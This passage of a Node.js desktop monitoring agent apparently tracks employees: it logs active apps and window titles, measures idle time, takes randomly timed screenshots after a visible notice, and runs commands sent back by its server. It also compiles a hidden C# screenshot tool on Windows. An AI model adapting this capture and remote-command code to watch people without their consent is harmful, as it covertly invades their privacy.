      clientState.windowTitle = data.title || "Desktop";
      if (typeof data.idle === "number") {
        clientState.idleSecondsCounter = data.idle;
        clientState.isCurrentlyIdle = data.idle >= configState.idleThresholdSeconds;
      }
    } catch { }
  });
  macProcess.on("close", () => {
    console.log("⚠️ macOS telemetry stream closed. Restarting in 5s...");
    setTimeout(startPersistentTelemetryStreamMac, 5000);
  });
}

// ── Screenshot capture → returns { buffer, contentType } or null ──────────────
async function captureScreenshot() {
  if (IS_WIN) return captureScreenshotWin();
  if (IS_MAC) return captureScreenshotMac();
  return null;
}

async function captureScreenshotMac() {
  const tmpImg = path.join(os.tmpdir(), `tracker_cap_${Date.now()}.jpg`);
  try {
    await new Promise((resolve, reject) =>
      exec(`screencapture -x "${tmpImg}"`, (err) => (err ? reject(err) : resolve()))
    );
    if (!fs.existsSync(tmpImg)) throw new Error("Screenshot file not created");
    const buffer = fs.readFileSync(tmpImg);
    fs.unlinkSync(tmpImg);
    return { buffer, contentType: "image/jpeg" };
  } catch (err) {
    console.error("❌ Screenshot capture failed (macOS):", err.message);
    return null;
  }
}

async function captureScreenshotWin() {
  const tmpImg = path.join(os.tmpdir(), "tracker_cap.jpg");
  const cscPath = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe";
  const exePath = path.join(os.tmpdir(), "tracker_screenshot.exe");

  if (!fs.existsSync(exePath)) {
    const csCode = `
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
class Program {
    static void Main(string[] args) {
        if (args.Length == 0) return;
        var screen = Screen.PrimaryScreen.Bounds;
        using (var bmp = new Bitmap(screen.Width, screen.Height)) {
            using (var g = Graphics.FromImage(bmp)) {
                g.CopyFromScreen(screen.X, screen.Y, 0, 0, bmp.Size);
            }
            float scale = screen.Width > 1024 ? 1024f / screen.Width : 1f;
            int w = (int)(screen.Width * scale);
            int h = (int)(screen.Height * scale);
            using (var resized = new Bitmap(bmp, w, h)) {
                var codec = GetEncoderInfo("image/jpeg");
                var ep = new EncoderParameters(1);
                ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 50L);
                resized.Save(args[0], codec, ep);
            }
        }
    }
    private static ImageCodecInfo GetEncoderInfo(string mimeType) {
        foreach (var enc in ImageCodecInfo.GetImageEncoders())
            if (enc.MimeType == mimeType) return enc;
        return null;
    }
}`;
    const csPath = path.join(os.tmpdir(), "tracker_screenshot.cs");
    fs.writeFileSync(csPath, csCode);
    try {
      await new Promise((resolve, reject) =>
        exec(
          `"${cscPath}" /nologo /r:System.Drawing.dll,System.Windows.Forms.dll /out:"${exePath}" "${csPath}"`,
          { windowsHide: true },
          (err) => (err ? reject(err) : resolve())
        )
      );
      fs.unlinkSync(csPath);
    } catch (err) {
      console.error("❌ Failed to compile screenshot tool:", err.message);
      return null;
    }
  }

  try {
    await new Promise((resolve, reject) =>
      exec(`"${exePath}" "${tmpImg}"`, { windowsHide: true }, (err) =>
        err ? reject(err) : resolve()
      )
    );
    if (!fs.existsSync(tmpImg)) return null;
    const buffer = fs.readFileSync(tmpImg);
    fs.unlinkSync(tmpImg);
    return { buffer, contentType: "image/jpeg" };
  } catch (err) {
    console.error("❌ Screenshot capture failed (Windows):", err.message);
    return null;
  }
}

// ── Screenshot upload via secure presigned object-storage flow ────────────────
async function captureAndUploadScreenshot() {
  // Transparency: always show a visible notice BEFORE capturing.
  await showNotice(
    "Screenshot",
    "A screenshot of your screen is being captured for workforce analytics."
  );

  const shot = await captureScreenshot();
  if (!shot) return;

  try {
    const { uploadURL, storageKey } = await apiPost("/screenshots/request-url", {});
    await putBytes(uploadURL, shot.buffer, shot.contentType);
    await apiPost("/screenshots", {
      storageKey,
      capturedAt: getSyncDate().toISOString(),
      fileSizeBytes: shot.buffer.length,
    });
    console.log(`✅ Screenshot uploaded (${Math.ceil(shot.buffer.length / 1024)} KB).`);
  } catch (err) {
    console.error("❌ Failed to upload screenshot:", err.message);
  }
}

// ── Sync cycle: heartbeat (+ config/commands) then activity batch ─────────────
async function syncTelemetry() {
  // 1. Heartbeat — liveness + config + lock state + pending commands.
  try {
    const res = await apiPost("/heartbeat", { agentVersion: AGENT_VERSION });
    if (res?.serverTime) {
      clientState.serverClockOffset = new Date(res.serverTime).getTime() - Date.now();
    }
    if (typeof res?.isLocked === "boolean") clientState.isLocked = res.isLocked;
    applyConfig(res?.config);
    if (Array.isArray(res?.commands)) {
      for (const cmd of res.commands) await executeCommand(cmd);
    }
  } catch (err) {
    if (!clientState.isOfflineSince) {
      clientState.isOfflineSince = Date.now();
      console.warn("📉 Server unreachable. Caching activity locally...");
    }
    // No heartbeat -> we likely can't send activity either; queue it below.
  }

  // 2. Activity — wrap the interval we just observed into one log entry.
  const now = Date.now();
  let elapsed = Math.max(1, Math.floor((now - clientState.lastSyncTime) / 1000));
  const startMs = clientState.lastSyncTime;
  clientState.lastSyncTime = now;

  const cap = configState.syncIntervalSeconds + 60;
  if (elapsed > cap) elapsed = cap; // ignore sleep/hibernation gaps

  if (configState.monitoringEnabled) {
    const idleSeconds = clientState.isCurrentlyIdle
      ? Math.min(elapsed, clientState.idleSecondsCounter)
      : 0;
    const logItem = {
      processName: clientState.activeApp || "System",
      windowTitle: clientState.windowTitle || "",
      startedAt: new Date(startMs + clientState.serverClockOffset).toISOString(),
      endedAt: new Date(now + clientState.serverClockOffset).toISOString(),
      durationSeconds: elapsed,
      idleSeconds,
    };

    // Drain oldest-first, at most 500 per request (server cap). Any remainder
    // stays queued for the next cycle so nothing is dropped under backlog.
    const combined = [...offlineQueue.logs, logItem];
    const batch = combined.slice(0, 500);
    try {
      await apiPost("/activity", { logs: batch });
      offlineQueue.logs = combined.slice(batch.length);
      offlineQueue.save();
      console.log(
        `📝 Sent ${batch.length} activity log(s): [${logItem.processName}] ${elapsed}s` +
        (idleSeconds ? ` (idle ${idleSeconds}s)` : "") +
        (offlineQueue.logs.length ? ` — ${offlineQueue.logs.length} still queued` : "")
      );
    } catch (err) {
      offlineQueue.add(logItem);
      console.warn(`⏸️ Activity queued offline (${offlineQueue.logs.length} pending).`);
    }
  }
}

// ── Recursive loops ───────────────────────────────────────────────────────────
async function runSyncCycle() {
  await syncTelemetry();
  const nextMs = Math.max(30 * 1000, configState.syncIntervalSeconds * 1000);
  syncTimer = setTimeout(runSyncCycle, nextMs);
}

async function runScreenshotCycle() {
  if (configState.monitoringEnabled && !clientState.isCurrentlyIdle && !clientState.isLocked) {
    await captureAndUploadScreenshot();
  } else {
    console.log("⏸️ Skipping screenshot (idle, locked, or monitoring disabled).");
  }
  const min = configState.screenshotMinMinutes;
  const max = Math.max(min, configState.screenshotMaxMinutes);
  const randMinutes = Math.random() * (max - min) + min;
  const nextMs = Math.max(60 * 1000, Math.floor(randMinutes * 60 * 1000));
  console.log(`⏱️ Next screenshot in ~${(nextMs / 60000).toFixed(1)} min.`);
  screenshotTimer = setTimeout(runScreenshotCycle, nextMs);
}

// ── Boot ──────────────────────────────────────────────────────────────────────
async function main() {
  console.log("🚀 Active Tracker (secure client) starting...");
  console.log(`🔗 Server: ${SERVER_BASE}`);

  const enrolled = await ensureEnrolled();
  if (!enrolled) {
    process.exit(0);
    return;
  }

  console.log(
    `🟢 Monitoring ACTIVE on ${clientState.systemName} ` +
    `(consent recorded by: ${clientState.consentName || "unknown"}). ` +
    `Screenshots show a notice each time.`
  );

  startPersistentTelemetryStream();

  // Idle accounting (Windows resets on mouse move; macOS reports idle directly).
  setInterval(() => {
    if (!IS_MAC) {
      clientState.idleSecondsCounter += 2;
      if (clientState.idleSecondsCounter >= configState.idleThresholdSeconds) {
        clientState.isCurrentlyIdle = true;
      }
    }
  }, 2000);

  setTimeout(runSyncCycle, 1500);
  setTimeout(runScreenshotCycle, 10000);
}

main().catch((err) => {
  console.error("❌ Tracker client crashed:", err);
  process.exit(1);
});
